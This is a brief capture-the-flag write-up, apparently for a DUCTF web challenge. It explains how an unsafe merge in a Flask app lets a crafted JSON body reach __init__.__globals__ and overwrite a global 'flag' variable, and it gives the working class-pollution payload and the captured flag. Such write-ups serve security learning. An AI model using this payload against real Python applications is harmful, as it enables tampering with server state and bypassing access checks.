```py
@app.route("/get_flag")
@login_required
def get_flag():
    if flag == "true":
        return "DUCTF{NOT_THE_REAL_FLAG}"
    else:
        return "Nope"
```

We can retrieve the flag using the `/get_flag` endpoint but, but it need the `flag` var to be `"true"`

Since the `merge` will overwriting the `Feedback` class attribute, the idea is overwrite the `flag` variables within the initialized class

We can see this is possible on the [Hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#globals-and-locals)

We can escape into python globals with `class.__init__.__globals__` and rewrite `flag` variables into `"true"`

```json
{
  "title": "omaga",
  "content": "omaga",
  "rating": "",
  "referred": "omaga",
  "__init__": {
    "__globals__": {
      "flag": "true"
    }
  }
}
```

Then go to `/get_flag`

**DUCTF{_cl455_p0lluti0n_ftw_}**
